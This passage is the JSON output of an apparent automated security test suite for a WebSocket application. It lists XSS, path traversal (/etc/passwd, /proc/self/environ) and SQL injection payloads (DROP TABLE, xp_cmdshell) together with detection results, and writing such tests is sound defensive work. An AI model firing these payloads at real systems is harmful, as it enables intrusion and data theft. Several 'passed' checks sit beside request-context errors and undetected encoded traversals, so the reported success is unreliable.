Malicious pattern detected in username\n    \u2713 Malicious pattern detected in room_name\n    \u2713 Malicious pattern detected in event_data\nTesting bypass payload: vbscript:msgbox(\"XSS\")...\n    \u2713 Malicious pattern detected in message_content\n    \u2713 Malicious pattern detected in username\n    \u2713 Malicious pattern detected in room_name\n    \u2713 Malicious pattern detected in event_data\nTesting bypass payload: data:text/html,<script>alert(\"XSS\")</script>...\n    \u2713 Malicious pattern detected in message_content\n    \u2713 Malicious pattern detected in username\n    \u2713 Malicious pattern detected in room_name\n    \u2713 Malicious pattern detected in event_data\nTesting bypass payload: <img src=\"x\" onerror=\"alert(String.fromCharCode(88...\n    \u2713 Malicious pattern detected in message_content\n    \u2713 Malicious pattern detected in username\n    \u2713 Malicious pattern detected in room_name\n    \u2713 Malicious pattern detected in event_data\nTesting bypass payload: <svg><script>alert&#40;1&#41;</script>...\n    \u2713 Malicious pattern detected in message_content\n    \u2713 Malicious pattern detected in username\n    \u2713 Malicious pattern detected in room_name\n    \u2713 Malicious pattern detected in event_data\nTesting bypass payload: <iframe src=\"javascript:alert(`XSS`)\"></iframe>...\n    \u2713 Malicious pattern detected in message_content\n    \u2713 Malicious pattern detected in username\n    \u2713 Malicious pattern detected in room_name\n    \u2713 Malicious pattern detected in event_data\n\u2713 Input validation bypass attempts tested\n[2025-08-28T15:53:14.478076] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:14.478123] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing Path Traversal Prevention ===\nTesting path traversal payload: ../../../etc/passwd...\n    \u2713 Path traversal detected in file_path\n    \u2713 Path traversal detected in template_name\n    \u2713 Path traversal detected in resource_id\n    \u2713 Path traversal detected in namespace\nTesting path traversal payload: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts...\n    \u2713 Path traversal detected in file_path\n    \u2713 Path traversal detected in template_name\n    \u2713 Path traversal detected in resource_id\n    \u2713 Path traversal detected in namespace\nTesting path traversal payload: ....//....//....//etc/passwd...\n    \u2713 Path traversal detected in file_path\n    \u2713 Path traversal detected in template_name\n    \u2713 Path traversal detected in resource_id\n    \u2713 Path traversal detected in namespace\nTesting path traversal payload: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd...\n    \u2713 Path traversal detected in file_path\n    \u2713 Path traversal detected in template_name\n    \u2713 Path traversal detected in resource_id\n    \u2713 Path traversal detected in namespace\nTesting path traversal payload: ..%252f..%252f..%252fetc%252fpasswd...\n    \u2713 No path traversal detected in file_path\n    \u2713 No path traversal detected in template_name\n    \u2713 No path traversal detected in resource_id\n    \u2713 No path traversal detected in namespace\nTesting path traversal payload: ..%c0%af..%c0%af..%c0%afetc%c0%afpasswd...\n    \u2713 No path traversal detected in file_path\n    \u2713 No path traversal detected in template_name\n    \u2713 No path traversal detected in resource_id\n    \u2713 No path traversal detected in namespace\nTesting path traversal payload: ../../../proc/self/environ...\n    \u2713 Path traversal detected in file_path\n    \u2713 Path traversal detected in template_name\n    \u2713 Path traversal detected in resource_id\n    \u2713 Path traversal detected in namespace\nTesting path traversal payload: ..\\..\\..\\boot.ini...\n    \u2713 Path traversal detected in file_path\n    \u2713 Path traversal detected in template_name\n    \u2713 Path traversal detected in resource_id\n    \u2713 Path traversal detected in namespace\nTesting path traversal payload: /var/log/apache/access.log...\n    \u2713 No path traversal detected in file_path\n    \u2713 No path traversal detected in template_name\n    \u2713 No path traversal detected in resource_id\n    \u2713 No path traversal detected in namespace\nTesting path traversal payload: ../../../../../../../../etc/passwd%00...\n    \u2713 Path traversal detected in file_path\n    \u2713 Path traversal detected in template_name\n    \u2713 Path traversal detected in resource_id\n    \u2713 Path traversal detected in namespace\n\u2713 Path traversal prevention validated\n[2025-08-28T15:53:14.478293] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:14.478338] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing Rate Limiting Enforcement ===\n[2025-08-28T15:53:14.478385] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.478415] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.583505] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.583640] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.688821] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.689188] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.794265] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.794480] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:14.899681] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:14.900006] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:15.004505] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:15.004890] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:15.108963] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:15.109598] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:15.213700] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:15.213853] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:15.319030] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:15.319383] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:15.419964] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:15.420361] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:15.524917] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:15.525312] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:15.630521] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:15.630888] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:15.736091] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:15.736452] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:15.841360] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:15.841812] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:15.944180] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:15.944644] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:16.049907] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.050262] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:16.151801] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.152112] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:16.255779] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.256254] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:16.357773] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.358274] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n[2025-08-28T15:53:16.459881] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.460318] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\nConnection attempts: 20\nSuccessful: 0\nFailed/Limited: 20\nDuration: 2.09s\nRate: 9.58 attempts/second\n\u2713 Rate limiting appears to be working\n\u2713 Rate limiting enforcement tested\n[2025-08-28T15:53:16.566311] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:16.566672] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing Session Hijacking Prevention ===\nTesting Invalid Session Token...\n[2025-08-28T15:53:16.566997] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.567134] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 Invalid Session Token properly handled\nTesting Expired Session Token...\n[2025-08-28T15:53:16.567237] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.567316] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 Expired Session Token properly handled\nTesting Malformed Session Data...\n[2025-08-28T15:53:16.567402] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.567482] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 Malformed Session Data properly handled\nTesting Empty Session Data...\n[2025-08-28T15:53:16.567550] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.567619] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 Empty Session Data properly handled\nTesting SQL Injection in Session...\n[2025-08-28T15:53:16.567686] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.567774] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 SQL Injection in Session properly handled\nTesting XSS in Session Data...\n[2025-08-28T15:53:16.567857] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.567921] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 XSS in Session Data properly handled\nTesting Session Token Too Long...\n[2025-08-28T15:53:16.567987] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.568051] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 Session Token Too Long properly handled\nTesting Negative User ID...\n[2025-08-28T15:53:16.568115] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.568179] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 Negative User ID properly handled\n\u2713 Session hijacking prevention validated\n[2025-08-28T15:53:16.568457] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:16.568584] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing SQL Injection Prevention ===\nTesting SQL injection payload: '; DROP TABLE users; --...\n[2025-08-28T15:53:16.568760] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.568838] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 SQL injection payload properly rejected\nTesting SQL injection payload: ' OR '1'='1...\n[2025-08-28T15:53:16.568905] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.568973] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 SQL injection payload properly rejected\nTesting SQL injection payload: ' UNION SELECT * FROM users --...\n[2025-08-28T15:53:16.569042] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.569110] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 SQL injection payload properly rejected\nTesting SQL injection payload: '; INSERT INTO users VALUES ('hacker', 'password')...\n[2025-08-28T15:53:16.569175] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.569244] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 SQL injection payload properly rejected\nTesting SQL injection payload: ' OR 1=1 --...\n[2025-08-28T15:53:16.569309] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.569374] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 SQL injection payload properly rejected\nTesting SQL injection payload: admin'--...\n[2025-08-28T15:53:16.569438] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.569502] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 SQL injection payload properly rejected\nTesting SQL injection payload: admin'/*...\n[2025-08-28T15:53:16.569564] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.569632] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 SQL injection payload properly rejected\nTesting SQL injection payload: ' OR 'x'='x...\n[2025-08-28T15:53:16.569698] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.569758] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 SQL injection payload properly rejected\nTesting SQL injection payload: '; EXEC xp_cmdshell('dir'); --...\n[2025-08-28T15:53:16.569825] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.569889] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 SQL injection payload properly rejected\nTesting SQL injection payload: ' AND (SELECT COUNT(*) FROM users) > 0 --...\n[2025-08-28T15:53:16.569962] ERROR websocket_auth_handler - Error extracting session ID: Working outside of request context.\n\nThis typically means that you attempted to use functionality that needed\nan active HTTP request. Consult the documentation on testing for\ninformation about how to avoid this problem. (taskName=None)\n[2025-08-28T15:53:16.570025] WARNING websocket_auth_handler - WebSocket security event: connection_no_session - {'ip_address': 'unknown', 'user_agent': 'unknown'} (taskName=None)\n  \u2713 SQL injection payload properly rejected\n\u2713 SQL injection prevention validated\n[2025-08-28T15:53:16.570344] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:16.570481] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing SSL/TLS Security Configuration ===\nHTTPS origins: 2\nHTTP origins: 6\n\u2713 Development environment - HTTP origins acceptable\n\u2713 SSL context can be created with secure defaults\n\u2713 SSL/TLS security configuration tested\n[2025-08-28T15:53:16.581757] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:16.581970] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing WebSocket Protocol Security ===\nConfigured transports: ['websocket', 'polling']\nPing timeout: 60ms\nPing interval: 25ms\nCORS credentials enabled: True\n\u2713 WebSocket protocol security tested\n[2025-08-28T15:53:16.582457] INFO websocket_config_manager - Generated CORS origins: ['http://localhost:5000', 'https://localhost:5000', 'http://127.0.0.1:5000', 'https://127.0.0.1:5000', 'http://localhost:3000', 'http://127.0.0.1:3000', 'http://localhost:8080', 'http://127.0.0.1:8080'] (taskName=None)\n[2025-08-28T15:53:16.582583] INFO websocket_config_manager - WebSocket configuration loaded successfully (taskName=None)\n\n=== Testing XSS Prevention in WebSocket Messages ===\nTesting XSS payload: <script>alert(\"XSS\")</script>...\n  \u2713 XSS payload detected and would be sanitized: <script>alert(\"XSS\")</script>...\nTesting XSS payload: <img src=x onerror=alert(\"XSS\")>...\n  \u2713 XSS payload detected and would be sanitized: <img src=x onerror=alert(\"XSS\"...\nTesting XSS payload: javascript:alert(\"XSS\")...\n  \u2713 XSS payload detected and would be sanitized: javascript:alert(\"XSS\")...\nTesting XSS payload: <svg onload=alert(\"XSS\")>...\n  \u2713 XSS payload detected and would be sanitized: <svg onload=alert(\"XSS\")>...\nTesting XSS payload: \"><script>alert(\"XSS\")</script>...\n  \u2713 XSS payload detected and would be sanitized: \"><script>alert(\"XSS\")</script...\nTesting XSS payload: ';alert('XSS');//...\n  \u2713 Payload appears safe: ';alert('XSS');//...\nTesting XSS payload: <iframe src=\"javascript:alert('XSS')\"></iframe>...\n  \u2713 XSS payload detected and would be sanitized: <iframe src=\"javascript:alert(...\nTesting XSS payload: <body onload=alert(\"XSS\")>...\n  \u2713 XSS payload detected and would be sanitized: <body onload=alert(\"XSS\")>...\nTesting XSS payload: <input onfocus=alert(\"XSS\") autofocus>...\n  \u2713 XSS payload detected and would be sanitized: <input onfocus=alert(\"XSS\") au...\nTesting XSS payload: <select onfocus=alert(\"XSS\") autofocus>...\n  \u2713 XSS payload detected and would be sanitized: <select onfocus=alert(\"XSS\") a...\n\u2713 XSS prevention in WebSocket messages validated\n",
      "stderr": "test_authentication_timing_attacks (tests.security.test_websocket_security_validation.WebSocketSecurityValidationTest.test_authentication_timing_attacks)\nTest prevention of timing attacks on authentication ... ok\ntest_command_injection_prevention (tests.security.test_websocket_security_validation.WebSocketSecurityValidationTest.test_command_injection_prevention)\nTest command injection prevention ... ok\ntest_cors_origin_spoofing_prevention (tests.security.test_websocket_security_validation.WebSocketSecurityValidationTest.test_cors_origin_spoofing_prevention)\nTest prevention of CORS origin spoofing attacks ... ok\ntest_csrf_protection_validation (tests.security.test_websocket_security_validation.WebSocketSecurityValidationTest.test_csrf_protection_validation)\nTest CSRF protection for WebSocket events ... ok\ntest_input_validation_bypass_attempts (tests.security.test_websocket_security_validation.WebSocketSecurityValidationTest.test_input_validation_bypass_attempts)\nTest various input validation bypass attempts ... ok\ntest_path_traversal_prevention (tests.security.test_websocket_security_validation.WebSocketSecurityValidationTest.test_path_traversal_prevention)\nTest path traversal attack prevention ... ok\ntest_rate_limiting_enforcement (tests.security.test_websocket_security_validation.WebSocketSecurityValidationTest.test_rate_limiting_enforcement)\nTest rate limiting enforcement for WebSocket connections ... ok\ntest_session_hijacking_prevention (tests.security.test_websocket_security_validation.WebSocketSecurityValidationTest.test_session_hijacking_prevention)\nTest prevention of session hijacking attacks ... ok\ntest_sql_injection_prevention (tests.security.test_websocket_security_validation.WebSocketSecurityValidationTest.test_sql_injection_prevention)\nTest SQL injection prevention in WebSocket authentication ... ok\ntest_ssl_tls_security_configuration (tests.security.test_websocket_security_validation.WebSocketSecurityValidationTest.test_ssl_tls_security_configuration)\nTest SSL/TLS security configuration for WebSocket connections ... ok\ntest_websocket_protocol_security (tests.security.test_websocket_security_validation.WebSocketSecurityValidationTest.test_websocket_protocol_security)\nTest WebSocket protocol-specific security measures ... ok\ntest_xss_prevention_in_websocket_messages (tests.security.test_websocket_security_validation.WebSocketSecurityValidationTest.test_xss_prevention_in_websocket_messages)\nTest XSS prevention in WebSocket message handling ... ok\n\n----------------------------------------------------------------------\nRan 12 tests in 2.183s\n\nOK\n",
      "duration": 14.27288007736206
    }
  },
  "statistics": {
    "total_tests": 3,
    "passed_tests": 3,
    "failed_tests": 0,
    "skipped_tests": 0,
    "success_rate": 100.0
  }
}